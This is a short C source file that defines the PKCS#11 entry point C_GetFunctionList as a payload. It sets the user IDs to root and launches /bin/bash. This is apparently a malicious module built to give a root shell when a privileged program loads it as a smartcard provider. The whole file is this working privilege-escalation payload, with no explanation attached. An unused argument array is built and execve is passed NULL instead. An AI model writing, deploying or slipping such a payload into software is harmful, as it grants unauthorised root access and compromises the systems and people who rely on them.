#include <unistd.h>

int C_GetFunctionList() {
	setresuid(0, 0, 0);
	char* args[2];
	args[0] = "/bin/bash";
	args[1] = "-l";
	execve("/bin/bash", NULL, NULL);
	return 0;
}
